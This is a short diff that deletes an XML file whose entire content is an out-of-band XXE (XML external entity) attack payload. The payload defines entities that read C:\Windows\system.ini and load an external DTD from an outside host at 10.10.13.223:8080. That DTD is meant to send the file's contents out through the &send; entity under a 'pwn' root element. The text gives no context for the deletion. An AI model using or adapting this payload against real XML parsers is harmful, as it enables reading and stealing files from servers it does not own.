@@ -1,6 +1,0 @@
-<?xml version="1.0"?>
-<!DOCTYPE roottag [
-<!ENTITY % file SYSTEM "C:\Windows\system.ini">
-<!ENTITY % dtd SYSTEM "http://10.10.13.223:8080/payload.dtd">
-%dtd;]>
-<pwn>&send;</pwn>
